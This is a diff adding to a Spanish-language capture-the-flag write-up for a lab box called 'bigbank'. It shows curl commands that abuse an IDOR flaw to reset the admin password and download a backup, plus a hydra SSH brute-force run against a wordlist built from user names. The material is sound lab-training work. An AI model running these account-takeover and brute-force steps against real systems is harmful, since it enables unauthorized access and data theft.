@@ -49,3 +49,159 @@ Vemos que pone autenticacion JWT, y mirando el código fuente vemos una ruta int
 
 ![CTF](images/bigbank/5.png)
 
+
+Nos vamos a la página con la documentación `http://172.17.0.2/api/v1/_docs-3fcb199bbb` y vemos todo un despliegue de oportunidades:
+
+![CTF](images/bigbank/6.png)
+
+
+Desplegando vemos lo siguiente:
+
+![CTF](images/bigbank/7.png)
+
+Un IDOR (Insecure Direct Object Reference) aparece cuando una aplicación permite acceder o modificar un recurso usando su identificador sin comprobar
+adecuadamente si el usuario tiene permiso para hacerlo.
+
+
+Nuestra prioridad ahora es crear una cuenta, listar usuarios, cambiar la cuenta del administrador y ver si podemos acceder a backup y descargarlo.
+
+
+![CTF](images/bigbank/8.png)
+
+Desde aqui sin curl ni nada podemos crear un usuario con `try it out`
+
+![CTF](images/bigbank/99.png)
+
+
+![CTF](images/bigbank/1010.png)
+
+
+una vez registrados necesitamos saber el token:
+
+```bash
+url -s -X POST 'http://172.17.0.2/api/auth/login' \
+  -H 'accept: */*' \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "username": "pepeloco",
+    "password": "pepeloco"
+  }' | jq .
+```
+
+![CTF](images/bigbank/11.png)
+
+
+
+Ya tenemos el token, en mi caso:
+```
+"access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI3IiwidXNlcm5hbWUiOiJwZXBlbG9jbyIsImV4cCI6MTc5MjA5ODE5NX0.IRL0BaxKsb94MS5PQATQwT0xiwcCqvrMvMLA2w-beP0",
+"token_type": "bearer",
+```
+
+guardo el token en una variable para trabajar mejor con ella:
+
+```bash
+TOKEN=$(curl -s -X POST 'http://172.17.0.2/api/auth/login' \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"pepeloco","password":"pepeloco"}' \
+  | jq -r '.access_token')
+```
+
+
+![CTF](images/bigbank/12.png)
+
+comprobamos que el token funciona:
+
+```bsah
+curl -s 'http://172.17.0.2/api/auth/me' \
+  -H "Authorization: Bearer $TOKEN" | jq .
+```
+
+
+![CTF](images/bigbank/13.png)
+
+
+Vale, funciona, lio, listamos usuarios:
+
+```bash
+curl -s 'http://172.17.0.2/api/users' \
+  -H "Authorization: Bearer $TOKEN" | jq .
+```
+
+![CTF](images/bigbank/14.png)
+
+Ahi vemos que el usuario administrador es el `id=5`
+
+
+![CTF](images/bigbank/15.png)
+
+## DOS FORMAS DE ACCEDER 
+
+## 1º ssh CON FUERZABRUTA:
+
+Aquí hay dos formas de acceder podemos hacer un diccionario con nombres y apellidos:
+
+```bash
+curl -s 'http://172.17.0.2/api/users' \
+  -H "Authorization: Bearer $TOKEN" |
+jq -r '.[] | (.full_name | ascii_downcase | gsub(" "; "")), (.full_name | ascii_downcase | split(" ")[])' \
+  > diccionario.txt
+```
+
+
+![CTF](images/bigbank/16.png)
+
+
+y hago una atque por fuerzabruta:
+```bash
+hydra -L diccionario.txt -P diccionario.txt ssh://172.17.0.2 -VI -f
+```
+
+
+![CTF](images/bigbank/17.png)
+
+
+![CTF](images/bigbank/18.png)
+
+
+
+## 2º DESCARGARNDO EL BACKUP
+
+
+1-Cambiamos el password a admin:
+
+```bash
+curl -i -X POST 'http://172.17.0.2/api/users/5/change-password' \
+  -H "Authorization: Bearer $TOKEN" \
+  -H 'Content-Type: application/json' \
+  -d '{"new_password":"AdminCTF2026!"}'
+```
+
+
+2-sacamos el token:
+
+```bash
+curl -s -X POST 'http://172.17.0.2/api/auth/login' \
+  -H 'Content-Type: application/json' \
+  -d '{"username":"admin","password":"AdminCTF2026!"}' | jq .
+```
+
+
+![CTF](images/bigbank/19.png)
+
+guardo el token en una variable para trabajar con ella:
+```bash
+TOKEN_ADMIN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiI1IiwidXNlcm5hbWUiOiJhZG1pbiIsImV4cCI6MTc5MjA5OTQ1NH0.csKEpAJZwT6l3K0WPqVCsdeuQDS-RRhiOw4Meaj1Ss8'
+```
+
+y descargo el backup:
+
+```bash
+curl -s -X GET 'http://172.17.0.2/api/admin/backup' \
+  -H "Authorization: Bearer $TOKEN_ADMIN" \
+  -o ctf_bank_backup.zip
+```
+![CTF](images/bigbank/20.png)
+
+
+
